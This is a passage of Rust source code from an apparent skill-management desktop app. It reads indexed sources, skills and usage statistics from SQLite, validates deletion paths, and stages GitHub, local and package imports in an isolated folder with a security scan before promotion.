        .map_err(|error| format!("Cannot prepare indexed source query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok(SourceCard {
                id: row.get(0)?,
                name: row.get(1)?,
                source_type: row.get(2)?,
                url: row.get(3)?,
                local_path: row.get(4)?,
                mode: row.get(5)?,
                category_id: row.get(6)?,
                note: row.get(7)?,
                enabled: row.get::<_, i64>(8)? != 0,
                rating: row.get::<_, i64>(9)?.clamp(0, 5) as u8,
                created_at: row.get(10)?,
                health: row.get(11)?,
                skill_count: row.get::<_, i64>(12)? as usize,
                tags: Vec::new(),
                usage_guide: row.get(13)?,
                metadata_origin: row.get(14)?,
                metadata_confidence: row.get(15)?,
                user_folder_id: row.get(16)?,
                user_folder_name: row.get(17)?,
                user_folder_color: row.get(18)?,
            })
        })
        .map_err(|error| format!("Cannot read indexed sources: {}", error))?;

    let mut sources = collect_rows(rows, "source")?;
    for source in &mut sources {
        source.tags = tag_map.remove(&source.id).unwrap_or_default();
    }
    Ok(sources)
}

fn read_indexed_skills(connection: &Connection) -> Result<Vec<SkillCard>, String> {
    let mut tag_map = read_tag_map(connection, "skill")?;
    let mut statement = connection
        .prepare(
            "SELECT
                skills.id,
                COALESCE(NULLIF(skill_overrides.display_name, ''), skills.name) AS display_name,
                skills.folder_name,
                COALESCE(NULLIF(skill_overrides.category_id, ''), skills.category_id) AS category_id,
                COALESCE(NULLIF(skill_overrides.description, ''), skills.description) AS description,
                COALESCE(skill_overrides.note, '') AS note,
                COALESCE(skills.source_id, '') AS source_id,
                COALESCE(sources.name, 'local') AS source_name,
                skills.health_status,
                COALESCE(skill_overrides.enabled, skills.enabled) AS enabled,
                COALESCE(skill_overrides.rating, 0) AS rating,
                skills.relative_path,
                COALESCE(skills.is_router_hub, 0) AS is_router_hub,
                skills.usage_guide,
                CASE
                    WHEN skill_overrides.skill_id IS NOT NULL AND (
                        skill_overrides.display_name <> ''
                        OR skill_overrides.category_id <> ''
                        OR skill_overrides.description <> ''
                        OR skill_overrides.note <> ''
                    )
                    THEN 'manual+' || skills.metadata_origin
                    ELSE skills.metadata_origin
                END AS metadata_origin,
                CASE
                    WHEN skill_overrides.skill_id IS NOT NULL AND (
                        skill_overrides.display_name <> ''
                        OR skill_overrides.category_id <> ''
                        OR skill_overrides.description <> ''
                        OR skill_overrides.note <> ''
                    )
                    THEN 1.0
                    ELSE skills.metadata_confidence
                END AS metadata_confidence,
                COALESCE(skill_folder_memberships.folder_id, source_folder_memberships.folder_id, '') AS user_folder_id,
                COALESCE(skill_folders.name, '') AS user_folder_name,
                COALESCE(skill_folders.color, '') AS user_folder_color
            FROM skills
            LEFT JOIN sources ON sources.id = skills.source_id
            LEFT JOIN skill_overrides ON skill_overrides.skill_id = skills.id
            LEFT JOIN skill_folder_memberships ON skill_folder_memberships.skill_id = skills.id
            LEFT JOIN source_folder_memberships ON source_folder_memberships.source_id = skills.source_id
            LEFT JOIN skill_folders ON skill_folders.id = COALESCE(skill_folder_memberships.folder_id, source_folder_memberships.folder_id)
            WHERE NOT (
                skills.source_id IS NULL
                AND COALESCE(skills.is_router_hub, 0) = 1
                AND (
                    skills.relative_path LIKE '%AI-SkillHub-local-routers%'
                    OR skills.description LIKE '%[CONFLICT-DISPATCHER]%'
                )
            )
            ORDER BY lower(display_name)",
        )
        .map_err(|error| format!("Cannot prepare indexed skill query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                SkillCard {
                    id: row.get(0)?,
                    source_id: row.get(6)?,
                    name: row.get(1)?,
                    folder_name: row.get(2)?,
                    category: row.get(3)?,
                    description: row.get(4)?,
                    note: row.get(5)?,
                    source: row.get(7)?,
                    health: row.get(8)?,
                    enabled: row.get::<_, i64>(9)? != 0,
                    rating: row.get::<_, i64>(10)?.clamp(0, 5) as u8,
                    relative_path: row.get(11)?,
                    tags: Vec::new(),
                    is_router_hub: row.get::<_, i64>(12)? != 0,
                    usage_guide: row.get(13)?,
                    metadata_origin: row.get(14)?,
                    metadata_confidence: row.get(15)?,
                    user_folder_id: row.get(16)?,
                    user_folder_name: row.get(17)?,
                    user_folder_color: row.get(18)?,
                },
            ))
        })
        .map_err(|error| format!("Cannot read indexed skills: {}", error))?;

    let mut skills = Vec::new();
    for row in rows {
        let (skill_id, mut skill) =
            row.map_err(|error| format!("Cannot decode indexed skill: {}", error))?;
        skill.tags = tag_map.remove(&skill_id).unwrap_or_default();
        skills.push(skill);
    }
    Ok(skills)
}

fn read_skill_conflict_choice_state(
    connection: &Connection,
) -> Result<HashMap<String, SkillConflictChoiceState>, String> {
    let mut statement = connection
        .prepare(
            "SELECT conflict_key, default_skill_id, status, updated_at
            FROM skill_conflict_choices",
        )
        .map_err(|error| format!("Cannot prepare skill conflict choices query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                SkillConflictChoiceState {
                    default_skill_id: row.get(1)?,
                    status: row.get(2)?,
                    updated_at: row.get(3)?,
                },
            ))
        })
        .map_err(|error| format!("Cannot read skill conflict choices: {}", error))?;

    let mut choices = HashMap::new();
    for row in rows {
        let (key, choice) =
            row.map_err(|error| format!("Cannot decode skill conflict choice: {}", error))?;
        choices.insert(normalize_skill_lookup(&key), choice);
    }
    Ok(choices)
}

fn usage_event_counts_as_skill_invocation(event_type: &str) -> bool {
    matches!(
        event_type.trim(),
        "invoke_skill" | "skill_invoked" | "skill_call" | "run_skill"
    )
}

fn read_indexed_usage_stats(connection: &Connection) -> Result<Vec<UsageStatCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT target_type, target_id, target_name, source_name, created_at, event_type
            FROM usage_events
            ORDER BY CAST(created_at AS INTEGER) DESC",
        )
        .map_err(|error| format!("Cannot prepare usage event query: {}", error))?;

    let rows = statement
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, String>(4)?,
                row.get::<_, String>(5)?,
            ))
        })
        .map_err(|error| format!("Cannot read usage events: {}", error))?;

    let now = current_unix_nanos();
    let seven_day_floor = now.saturating_sub(7 * DAY_NANOS);
    let thirty_day_floor = now.saturating_sub(30 * DAY_NANOS);
    let mut stats: HashMap<String, UsageStatCard> = HashMap::new();

    for row in rows {
        let (target_type, target_id, target_name, source_name, created_at, event_type) =
            row.map_err(|error| format!("Cannot decode usage event: {}", error))?;
        if target_type != "skill" || !usage_event_counts_as_skill_invocation(&event_type) {
            continue;
        }
        let key = format!("{}\u{1f}{}", target_type, target_id);
        let created_at_nanos = created_at.parse::<u128>().unwrap_or(0);
        let stat = stats.entry(key).or_insert_with(|| UsageStatCard {
            target_type: target_type.clone(),
            target_id: target_id.clone(),
            target_name: if target_name.is_empty() {
                target_id.clone()
            } else {
                target_name.clone()
            },
            source_name: source_name.clone(),
            total_count: 0,
            seven_day_count: 0,
            thirty_day_count: 0,
            last_used_at: created_at.clone(),
        });

        stat.total_count += 1;
        if created_at_nanos >= seven_day_floor {
            stat.seven_day_count += 1;
        }
        if created_at_nanos >= thirty_day_floor {
            stat.thirty_day_count += 1;
        }
        if created_at.parse::<u128>().unwrap_or(0) > stat.last_used_at.parse::<u128>().unwrap_or(0)
        {
            stat.last_used_at = created_at;
        }
        if stat.source_name.is_empty() && !source_name.is_empty() {
            stat.source_name = source_name;
        }
    }

    let mut output = stats.into_values().collect::<Vec<_>>();
    output.sort_by(|left, right| {
        right
            .total_count
            .cmp(&left.total_count)
            .then_with(|| right.thirty_day_count.cmp(&left.thirty_day_count))
            .then_with(|| right.seven_day_count.cmp(&left.seven_day_count))
            .then_with(|| right.last_used_at.cmp(&left.last_used_at))
            .then_with(|| left.target_name.cmp(&right.target_name))
    });
    Ok(output)
}

fn read_indexed_source_popularity(
    connection: &Connection,
    sources: &[SourceCard],
    usage_stats: &[UsageStatCard],
) -> Result<Vec<SourcePopularityCard>, String> {
    let usage_counts = read_source_usage_counts(connection).unwrap_or_default();
    let mut statement = connection
        .prepare(
            "SELECT
                source_name, url, owner, repo, stars, forks, open_issues,
                last_updated_at, fetched_at, cache_status, error, created_at
            FROM source_popularity_cache
            WHERE source_id = ?1",
        )
        .map_err(|error| format!("Cannot prepare source popularity cache query: {}", error))?;
    let mut output = Vec::new();

    for source in sources {
        let Some((owner, repo)) = parse_github_repo(&source.url) else {
            continue;
        };

        let cached = statement
            .query_row(params![&source.id], |row| {
                Ok(SourcePopularityCard {
                    source_id: source.id.clone(),
                    source_name: row.get::<_, String>(0)?,
                    url: row.get::<_, String>(1)?,
                    owner: row.get::<_, String>(2)?,
                    repo: row.get::<_, String>(3)?,
                    created_at: row.get::<_, String>(11)?,
                    stars: row.get::<_, i64>(4)?.max(0) as u64,
                    forks: row.get::<_, i64>(5)?.max(0) as u64,
                    open_issues: row.get::<_, i64>(6)?.max(0) as u64,
                    last_updated_at: row.get::<_, String>(7)?,
                    fetched_at: row.get::<_, String>(8)?,
                    cache_status: row.get::<_, String>(9)?,
                    error: row.get::<_, String>(10)?,
                    local_total_count: 0,
                    local_seven_day_count: 0,
                    local_thirty_day_count: 0,
                    trend_points: Vec::new(),
                })
            })
            .optional()
            .map_err(|error| format!("Cannot read source popularity cache: {}", error))?;

        let mut card = cached.unwrap_or_else(|| SourcePopularityCard {
            source_id: source.id.clone(),
            source_name: source.name.clone(),
            url: source.url.clone(),
            owner,
            repo,
            created_at: String::new(),
            stars: 0,
            forks: 0,
            open_issues: 0,
            last_updated_at: String::new(),
            fetched_at: String::new(),
            cache_status: "missing".to_string(),
            error: String::new(),
            local_total_count: 0,
            local_seven_day_count: 0,
            local_thirty_day_count: 0,
            trend_points: Vec::new(),
        });

        let by_id = usage_counts
            .get(&format!("id:{}", source.id))
            .copied()
            .unwrap_or_default();
        let by_name = usage_counts
            .get(&format!("name:{}", normalize_lookup_key(&source.name)))
            .copied()
            .unwrap_or_default();
        card.local_total_count = by_id.0 + by_name.0;
        card.local_seven_day_count = by_id.1 + by_name.1;
        card.local_thirty_day_count = by_id.2 + by_name.2;

        if card.local_total_count == 0 {
            for stat in usage_stats {
                let matches_skill_source = stat.target_type == "skill"
                    && normalize_lookup_key(&stat.source_name)
                        == normalize_lookup_key(&source.name);
                if matches_skill_source {
                    card.local_total_count += stat.total_count;
                    card.local_seven_day_count += stat.seven_day_count;
                    card.local_thirty_day_count += stat.thirty_day_count;
                }
            }
        }

        if card.source_name.is_empty() {
            card.source_name = source.name.clone();
        }
        if card.url.is_empty() {
            card.url = source.url.clone();
        }
        if card.cache_status == "error"
            && source_popularity_cache_status_for_error(&card.error) != "error"
        {
            card.cache_status = "deferred".to_string();
        }
        card.trend_points = read_source_popularity_history(connection, &source.id)?;
        output.push(card);
    }

    output.sort_by(|left, right| {
        right
            .local_total_count
            .cmp(&left.local_total_count)
            .then_with(|| right.stars.cmp(&left.stars))
            .then_with(|| left.source_name.cmp(&right.source_name))
    });

    Ok(output)
}

fn read_source_popularity_history(
    connection: &Connection,
    source_id: &str,
) -> Result<Vec<SourcePopularityTrendPointCard>, String> {
    let mut statement = connection
        .prepare(
            "SELECT sampled_at, stars, forks, open_issues, last_updated_at, cache_status
            FROM source_popularity_history
            WHERE source_id = ?1
            ORDER BY CAST(sampled_at AS INTEGER) ASC
            LIMIT 120",
        )
        .map_err(|error| format!("Cannot prepare source popularity history query: {}", error))?;
    let rows = statement
        .query_map(params![source_id], |row| {
            Ok(SourcePopularityTrendPointCard {
                sampled_at: row.get(0)?,
                stars: row.get::<_, i64>(1)?.max(0) as u64,
                forks: row.get::<_, i64>(2)?.max(0) as u64,
                open_issues: row.get::<_, i64>(3)?.max(0) as u64,
                last_updated_at: row.get(4)?,
                cache_status: row.get(5)?,
            })
        })
        .map_err(|error| format!("Cannot read source popularity history: {}", error))?;

    collect_rows(rows, "source popularity history")
}

fn read_source_usage_counts(
    connection: &Connection,
) -> Result<HashMap<String, (usize, usize, usize)>, String> {
    let mut statement = connection
        .prepare(
            "SELECT target_type, target_id, source_name, created_at, event_type
            FROM usage_events",
        )
        .map_err(|error| format!("Cannot prepare source usage count query: {}", error))?;
    let rows = statement
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, String>(4)?,
            ))
        })
        .map_err(|error| format!("Cannot read source usage count events: {}", error))?;
    let now = current_unix_nanos();
    let seven_day_floor = now.saturating_sub(7 * DAY_NANOS);
    let thirty_day_floor = now.saturating_sub(30 * DAY_NANOS);
    let mut output: HashMap<String, (usize, usize, usize)> = HashMap::new();

    for row in rows {
        let (target_type, _target_id, source_name, created_at, event_type) =
            row.map_err(|error| format!("Cannot decode source usage event: {}", error))?;
        let key = if target_type == "skill"
            && !source_name.trim().is_empty()
            && usage_event_counts_as_skill_invocation(&event_type)
        {
            format!("name:{}", normalize_lookup_key(&source_name))
        } else {
            continue;
        };
        let created_at_nanos = created_at.parse::<u128>().unwrap_or(0);
        let counts = output.entry(key).or_default();
        counts.0 += 1;
        if created_at_nanos >= seven_day_floor {
            counts.1 += 1;
        }
        if created_at_nanos >= thirty_day_floor {
            counts.2 += 1;
        }
    }

    Ok(output)
}

fn source_import_target_root(root: &Path) -> String {
    managed_sources_dir(root).to_string_lossy().to_string()
}

fn source_import_target_path(root: &Path, display_name: &str) -> String {
    managed_sources_dir(root)
        .join(sanitize_source_folder_name(display_name))
        .to_string_lossy()
        .to_string()
}

fn github_source_storage_name(owner: &str, repo: &str) -> String {
    sanitize_source_folder_name(&format!("{}--{}", owner.trim(), repo.trim()))
}

fn staged_github_storage_name(staged_path: &Path, fallback: &str) -> String {
    let metadata_path = staged_path.join(MANAGED_SOURCE_METADATA_FILE);
    if let Ok(metadata) = fs::read_to_string(metadata_path) {
        if let Ok(payload) = serde_json::from_str::<Value>(&metadata) {
            if let Some(url) = payload.get("url").and_then(Value::as_str) {
                if let Some((owner, repo)) = parse_github_repo(url) {
                    return github_source_storage_name(&owner, &repo);
                }
            }
        }
    }
    sanitize_source_folder_name(fallback)
}

fn validate_managed_source_delete_path(
    root: &Path,
    source: &SourceCard,
) -> Result<PathBuf, String> {
    if source.name.eq_ignore_ascii_case(ROUTER_HUB_FOLDER) {
        return Err("不能删除 AI SkillHub 本地父 Skill 路由仓库；它会由同步自动维护。".to_string());
    }
    if source.local_path.trim().is_empty() {
        return Err("该来源没有本地路径，无法执行删除。".to_string());
    }

    let sources_root = active_sources_dir(root);
    let canonical_sources_root = sources_root.canonicalize().map_err(|error| {
        format!(
            "Cannot read managed sources root {}: {}",
            sources_root.display(),
            error
        )
    })?;
    let source_path = PathBuf::from(source.local_path.trim());
    if source_path == canonical_sources_root {
        return Err("拒绝删除整个来源根目录。".to_string());
    }

    if source_path.exists() {
        let canonical_source_path = source_path.canonicalize().map_err(|error| {
            format!(
                "Cannot read source path {}: {}",
                source_path.display(),
                error
            )
        })?;
        if canonical_source_path == canonical_sources_root
            || !canonical_source_path.starts_with(&canonical_sources_root)
        {
            return Err(format!(
                "拒绝删除 AI SkillHub 管理目录之外的来源：{}",
                canonical_source_path.display()
            ));
        }
    } else {
        let parent = source_path
            .parent()
            .ok_or_else(|| "Cannot resolve source parent folder.".to_string())?;
        let canonical_parent = parent.canonicalize().map_err(|error| {
            format!("Cannot read source parent {}: {}", parent.display(), error)
        })?;
        if !canonical_parent.starts_with(&canonical_sources_root) {
            return Err(format!(
                "拒绝删除 AI SkillHub 管理目录之外的来源：{}",
                source_path.display()
            ));
        }
    }

    Ok(source_path)
}

fn remove_source_from_runtime_config(root: &Path, source: &SourceCard) -> Result<bool, String> {
    let config_file = skillhub_config_file(root);
    if !config_file.exists() {
        return Ok(false);
    }
    let raw = fs::read_to_string(&config_file).map_err(|error| {
        format!(
            "Cannot read runtime config {}: {}",
            config_file.display(),
            error
        )
    })?;
    let mut config: Value = serde_json::from_str(raw.trim_start_matches('\u{feff}'))
        .map_err(|error| format!("Cannot parse runtime config: {}", error))?;
    let Some(repositories) = config.get_mut("repositories").and_then(Value::as_array_mut) else {
        return Ok(false);
    };
    let before = repositories.len();
    repositories.retain(|repo| !runtime_config_repo_matches_source(repo, source));
    let changed = repositories.len() != before;
    if changed {
        let text = serde_json::to_string_pretty(&config)
            .map_err(|error| format!("Cannot serialize runtime config: {}", error))?;
        fs::write(&config_file, format!("{text}\n")).map_err(|error| {
            format!(
                "Cannot update runtime config {}: {}",
                config_file.display(),
                error
            )
        })?;
    }
    Ok(changed)
}

fn runtime_config_repo_matches_source(repo: &Value, source: &SourceCard) -> bool {
    let source_url = parse_github_repo(&source.url)
        .map(|(owner, repo)| normalized_github_repo_url(&owner, &repo))
        .unwrap_or_else(|| source.url.trim().trim_end_matches('/').to_lowercase());
    let repo_url = json_string(repo, "url");
    if !source_url.is_empty() {
        if let Some((owner, name)) = parse_github_repo(&repo_url) {
            if normalized_github_repo_url(&owner, &name).eq_ignore_ascii_case(&source_url) {
                return true;
            }
        }
        if repo_url
            .trim()
            .trim_end_matches('/')
            .eq_ignore_ascii_case(&source_url)
        {
            return true;
        }
    }

    let source_name = source.name.trim();
    let repo_name = json_string(repo, "name");
    if !source_name.is_empty() && repo_name.eq_ignore_ascii_case(source_name) {
        return true;
    }
    if let Some((_owner, name)) = parse_github_repo(&repo_url) {
        if name.eq_ignore_ascii_case(source_name) {
            return true;
        }
    }
    false
}

fn cleanup_deleted_source_sqlite_state(
    connection: &Connection,
    source_id: &str,
) -> Result<(), String> {
    for (table, column) in [
        ("source_overrides", "source_id"),
        ("source_tag_overrides", "source_id"),
        ("source_tags", "source_id"),
        ("source_popularity_cache", "source_id"),
        ("source_popularity_history", "source_id"),
    ] {
        connection
            .execute(
                &format!("DELETE FROM {table} WHERE {column} = ?1"),
                params![source_id],
            )
            .map_err(|error| {
                format!("Cannot clean deleted source state from {table}: {}", error)
            })?;
    }
    Ok(())
}

fn source_import_backup_path(root: &Path, display_name: &str) -> String {
    private_state_dir(root)
        .join("backups")
        .join("source-imports")
        .join(sanitize_source_folder_name(display_name))
        .to_string_lossy()
        .to_string()
}

fn deleted_source_backup_path(root: &Path, source: &SourceCard) -> Result<PathBuf, String> {
    let backup_root = private_state_dir(root)
        .join("backups")
        .join("deleted-sources");
    fs::create_dir_all(&backup_root).map_err(|error| {
        format!(
            "Cannot create recoverable source backup folder {}: {}",
            backup_root.display(),
            error
        )
    })?;
    let base_name = format!(
        "{}-{}-{}",
        unix_timestamp_string(),
        sanitize_source_folder_name(&source.name),
        stable_id("deleted-source", &source.id)
    );
    for suffix in 0..1000usize {
        let folder_name = if suffix == 0 {
            base_name.clone()
        } else {
            format!("{base_name}-{suffix}")
        };
        let candidate = backup_root.join(folder_name);
        if !candidate.exists() {
            return Ok(candidate);
        }
    }
    Err(format!(
        "Cannot allocate a unique recoverable backup path for source {}.",
        source.name
    ))
}

fn source_import_staging_root(root: &Path) -> PathBuf {
    private_state_dir(root)
        .join("staging")
        .join("source-imports")
}

fn source_import_report_root(root: &Path) -> PathBuf {
    private_state_dir(root)
        .join("reports")
        .join("source-import-staging")
}

fn source_import_promotion_report_root(root: &Path) -> PathBuf {
    private_state_dir(root)
        .join("reports")
        .join("source-import-promotion")
}

fn normalize_source_import_operation_id(value: Option<&str>) -> Result<String, String> {
    let candidate = value.unwrap_or("").trim();
    if candidate.is_empty() {
        return Ok(format!("source-import-{}", unix_timestamp_string()));
    }
    if candidate.len() > 96
        || !candidate.chars().all(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.')
        })
    {
        return Err("导入任务标识无效，请重新开始导入。".to_string());
    }
    Ok(candidate.to_string())
}

fn cleanup_cancelled_source_import(staged_path: &Path) -> Result<(), String> {
    if !staged_path.exists() {
        return Ok(());
    }
    fs::remove_dir_all(staged_path)
        .map_err(|_| "导入已取消，但临时隔离目录未能自动清理；请在维护工具中重试清理。".to_string())
}

fn sanitize_source_folder_name(value: &str) -> String {
    let folder = value
        .trim()
        .chars()
        .map(|character| {
            if character.is_alphanumeric() || matches!(character, '-' | '_' | '.') {
                character
            } else {
                '-'
            }
        })
        .collect::<String>()
        .trim_matches('-')
        .trim_matches('.')
        .to_string();
    if folder.is_empty() {
        "source-import".to_string()
    } else {
        folder
    }
}

fn build_source_import_plan(
    root: &Path,
    connection: &Connection,
    import_kind: &str,
    input: &str,
) -> Result<SourceImportPlanCard, String> {
    let normalized_kind = import_kind.trim().to_ascii_lowercase();
    let trimmed_input = input
        .trim()
        .trim_matches('"')
        .trim_matches('\'')
        .to_string();
    if trimmed_input.is_empty() {
        return Ok(SourceImportPlanCard {
            id: "source-import-empty".to_string(),
            import_kind: normalized_kind,
            input: trimmed_input,
            normalized_target: String::new(),
            target_root: source_import_target_root(root),
            target_path: String::new(),
            backup_path: String::new(),
            display_name: "空来源".to_string(),
            status: "blocked".to_string(),
            risk_level: "high".to_string(),
            write_gate_status: "blocked".to_string(),
            safe_to_continue: false,
            duplicate_source_id: String::new(),
            duplicate_reason: "请先输入 GitHub 地址、本地文件夹路径或 zip/.skill 文件路径。"
                .to_string(),
            skill_count: 0,
            prompt_count: 0,
            planned_steps: vec!["修正输入后重新生成 dry-run。".to_string()],
            install_plan_steps: Vec::new(),
            blocking_checks: vec!["缺少导入来源输入。".to_string()],
            rollback_summary: "没有执行任何文件写入。".to_string(),
        });
    }

    let sources = read_indexed_sources(connection)?;
    match normalized_kind.as_str() {
        "github" => build_github_source_import_plan(root, &sources, &trimmed_input),
        "local" => build_local_source_import_plan(root, &sources, &trimmed_input),
        "zip" | "skill" | "package" => {
            build_package_source_import_plan(root, &sources, &trimmed_input)
        }
        _ => Ok(SourceImportPlanCard {
            id: stable_id("source-import-unknown", &trimmed_input),
            import_kind: normalized_kind,
            input: trimmed_input,
            normalized_target: String::new(),
            target_root: source_import_target_root(root),
            target_path: String::new(),
            backup_path: String::new(),
            display_name: "未知导入类型".to_string(),
            status: "blocked".to_string(),
            risk_level: "high".to_string(),
            write_gate_status: "blocked".to_string(),
            safe_to_continue: false,
            duplicate_source_id: String::new(),
            duplicate_reason: "当前只支持 GitHub、本地文件夹和 zip/.skill 包的 dry-run。"
                .to_string(),
            skill_count: 0,
            prompt_count: 0,
            planned_steps: vec!["选择受支持的导入类型后重新生成计划。".to_string()],
            install_plan_steps: Vec::new(),
            blocking_checks: vec!["导入类型不受支持。".to_string()],
            rollback_summary: "没有执行任何文件写入。".to_string(),
        }),
    }
}

#[cfg(test)]
fn stage_source_import_candidate_in_connection(
    root: &Path,
    connection: &Connection,
    import_kind: &str,
    input: &str,
) -> Result<SourceImportExecutionCard, String> {
    let control = SourceImportControl::detached("source-import-test");
    stage_source_import_candidate_in_connection_with_control(
        root,
        connection,
        import_kind,
        input,
        &control,
    )
}

fn stage_source_import_candidate_in_connection_with_control(
    root: &Path,
    connection: &Connection,
    import_kind: &str,
    input: &str,
    control: &SourceImportControl,
) -> Result<SourceImportExecutionCard, String> {
    control.emit("inspect", "started", "正在检查来源地址与导入边界。", 0, 0);
    let plan = build_source_import_plan(root, connection, import_kind, input)?;
    let timestamp = unix_timestamp_string();
    let staging_root = source_import_staging_root(root);
    fs::create_dir_all(&staging_root)
        .map_err(|error| format!("Cannot create source import staging folder: {}", error))?;
    let staged_path = staging_root.join(format!(
        "{}-{}",
        sanitize_source_folder_name(&plan.display_name),
        timestamp
    ));
    if let Err(error) = control.ensure_active() {
        let _ = cleanup_cancelled_source_import(&staged_path);
        control.emit("inspect", "cancelled", &error, 0, 0);
        return Err(error);
    }
    control.emit("inspect", "completed", "来源检查完成。", 1, 1);

    let mut execution = SourceImportExecutionCard {
        id: format!("source-import-stage-{}-{}", plan.id, timestamp),
        import_kind: plan.import_kind.clone(),
        input: plan.input.clone(),
        status: "blocked".to_string(),
        risk_level: plan.risk_level.clone(),
        summary: String::new(),
        staged_path: staged_path.to_string_lossy().to_string(),
        report_path: String::new(),
        manifest_path: String::new(),
        copied_files: 0,
        copied_bytes: 0,
        skill_count: 0,
        prompt_count: 0,
        blocking_checks: plan.blocking_checks.clone(),
        rollback_steps: vec![
            "删除本次 staging 目录。".to_string(),
            "保留正式 app-next/data/github_sources、skills、Claude/Codex/Antigravity 目录不变。"
                .to_string(),
        ],
        real_write_scope: "staging-only".to_string(),
        download_method: String::new(),
        security_status: "not-run".to_string(),
        security_scanned_files: 0,
        security_findings: Vec::new(),
    };

    if !plan.safe_to_continue {
        execution.summary =
            "Staging not executed because the import plan is not safe to continue.".to_string();
        return write_source_import_execution_report(root, connection, execution, &timestamp);
    }

    let stage_result = match plan.import_kind.as_str() {
        "github" => {
            stage_github_source_import_with_control(&plan, &staged_path, &mut execution, control)
        }
        "local" => {
            control.emit("write", "started", "正在复制到隔离区。", 0, 0);
            stage_local_source_import(root, &plan, &staged_path, &mut execution)
        }
        "zip" | "skill" | "package" => {
            control.emit("zip", "started", "正在读取本地压缩包。", 0, 0);
            stage_package_source_import(&plan, &staged_path, &mut execution)
        }
        _ => {
            execution.status = "blocked".to_string();
            execution.summary = "Unsupported import kind; staging was not executed.".to_string();
            execution
                .blocking_checks
                .push("Unsupported import kind.".to_string());
            Ok(())
        }
    };
    if let Err(error) = stage_result {
        if control.is_cancelled() || error == SOURCE_IMPORT_CANCELLED_MESSAGE {
            cleanup_cancelled_source_import(&staged_path)?;
            control.emit("write", "cancelled", SOURCE_IMPORT_CANCELLED_MESSAGE, 0, 0);
            return Err(SOURCE_IMPORT_CANCELLED_MESSAGE.to_string());
        }
        return Err(error);
    }
    control.ensure_active().inspect_err(|error| {
        let _ = cleanup_cancelled_source_import(&staged_path);
        control.emit("write", "cancelled", error, 0, 0);
    })?;
    control.emit("write", "completed", "隔离区写入完成。", 1, 1);

    if staged_path.is_dir() {
        control.emit("security", "started", "正在执行逐文件安全扫描。", 0, 0);
        apply_security_scan_to_execution(&staged_path, &mut execution)?;
        if let Err(error) = control.ensure_active() {
            cleanup_cancelled_source_import(&staged_path)?;
            control.emit("security", "cancelled", &error, 0, 0);
            return Err(error);
        }
        control.emit(
            "security",
            "completed",
            format!(
                "安全扫描完成：检查 {} 个文件。",
                execution.security_scanned_files
            ),
            execution.security_scanned_files as u64,
            execution.security_scanned_files as u64,
        );
    }

    write_source_import_execution_report(root, connection, execution, &timestamp)
}

fn apply_security_scan_to_execution(
    staged_path: &Path,
    execution: &mut SourceImportExecutionCard,
) -> Result<(), String> {
    let report = security_scan::scan_source_tree(staged_path)?;
    let high_findings = report
        .findings
        .iter()
        .filter(|finding| finding.severity == "high")
        .count();
    let review_findings = report
        .findings
        .iter()
        .filter(|finding| finding.severity != "high")
        .count();
    execution.security_status = report.status.clone();
    execution.security_scanned_files = report.scanned_files;
    execution.security_findings = report.findings.clone();
    if report.risk_level == "high" {
        execution.risk_level = "high".to_string();
    } else if report.risk_level == "medium" && execution.risk_level == "low" {
        execution.risk_level = "medium".to_string();
    }
    for finding in report
        .findings
        .iter()
        .filter(|finding| finding.severity == "high")
        .take(24)
    {
        execution.blocking_checks.push(format!(
            "[{}] {}:{} — {}",
            finding.severity, finding.relative_path, finding.line, finding.summary
        ));
    }
    execution
        .blocking_checks
        .extend(report.blocking_reasons.iter().cloned());
    if !report.safe_to_promote() {
        execution.status = "blocked".to_string();
        execution.summary = format!(
            "安全扫描已阻止写入：{} 个高风险项、{} 个待复核项；已扫描 {} 个文件，其中 {} 个为脚本或可执行文件。来源仍保留在隔离区。",
            high_findings,
            review_findings,
            report.scanned_files,
            report.executable_files
        );
    } else if report.status == "review" && execution.status == "staged" {
        execution.summary = format!(
            "{} 安全扫描发现 {} 个待复核内容信号，并识别到 {} 个脚本或可执行文件；来源仍在隔离区，确认后才会写入技能库。",
            execution.summary, review_findings, report.executable_files
        );
    }
    Ok(())
}

fn stage_github_source_import_with_control(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
    execution: &mut SourceImportExecutionCard,
    control: &SourceImportControl,
) -> Result<(), String> {
    stage_github_source_import_with_git_program_and_control(
        plan,
        staged_path,
        execution,
        "git",
        control,
    )
}

#[cfg(test)]
fn stage_github_source_import_with_git_program(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
    execution: &mut SourceImportExecutionCard,
    git_program: &str,
) -> Result<(), String> {
    let control = SourceImportControl::detached("source-import-github-test");
    stage_github_source_import_with_git_program_and_control(
        plan,
        staged_path,
        execution,
        git_program,
        &control,
    )
}

fn stage_github_source_import_with_git_program_and_control(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
    execution: &mut SourceImportExecutionCard,
    git_program: &str,
    control: &SourceImportControl,
) -> Result<(), String> {
    control.ensure_active()?;
    control.emit("git", "started", "正在连接系统 Git，并读取仓库目录。", 0, 0);
    let mut command = Command::new(git_program);
    command
        .args([
            "clone",
            "--depth",
            "1",
            "--filter=blob:none",
            "--no-checkout",
            "--no-tags",
            "--progress",
            &plan.normalized_target,
        ])
        .arg(staged_path);
    let mut git_result = command_output_with_timeout_and_cancel(
        &mut command,
        Duration::from_secs(120),
        "GitHub 仓库目录下载超过 120 秒，已自动停止。请检查网络、仓库地址，或稍后重试。",
        Some(control.cancelled.as_ref()),
    );

    if matches!(&git_result, Ok(output) if output.status.success()) {
        control.emit(
            "git",
            "progress",
            "仓库目录已读取，正在下载可安装的 Skill 文件或完整 Prompt 工作区。",
            1,
            3,
        );
        git_result = complete_sparse_skill_checkout(git_program, staged_path, control);
    }

    if control.is_cancelled()
        || matches!(&git_result, Err(message) if message == SOURCE_IMPORT_CANCELLED_MESSAGE)
    {
        let _ = cleanup_cancelled_source_import(staged_path);
        control.emit("git", "cancelled", SOURCE_IMPORT_CANCELLED_MESSAGE, 0, 0);
